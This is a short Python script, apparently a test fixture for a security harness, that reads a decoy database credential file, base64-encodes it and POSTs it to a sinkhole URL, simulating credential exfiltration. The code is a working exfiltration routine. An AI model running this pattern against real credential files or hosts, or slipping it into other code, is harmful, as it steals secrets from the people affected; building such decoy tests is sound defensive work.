import base64
import os
from pathlib import Path
from urllib.request import Request, urlopen


raw = (Path(os.environ["AEGIS_DECOY_DIR"]) / "database_credential.txt").read_bytes()
request = Request(os.environ["AEGIS_SINKHOLE_URL"], data=base64.b64encode(raw), method="POST")
with urlopen(request, timeout=2) as response:
    response.read()
